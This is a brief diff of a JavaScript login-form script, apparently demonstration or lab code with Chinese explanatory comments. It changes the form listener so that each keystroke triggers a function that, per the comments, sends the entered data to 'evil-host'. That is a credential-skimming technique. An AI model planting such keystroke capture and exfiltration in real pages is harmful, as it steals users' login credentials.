@@ -69,7 +69,7 @@ const form1 = document.getElementById('loginform');
 // input时 执行函数
 // 说明: 每在表单的输入框中输入一个字符 就执行一次get_data_and_send_data函数
 // 所以通常客户端提交表单前会发出多个请求到evil-host
-form1.addEventListener('submit', get_data_and_send_data);
+form1.addEventListener('input', get_data_and_send_data);
 
 
 // -----
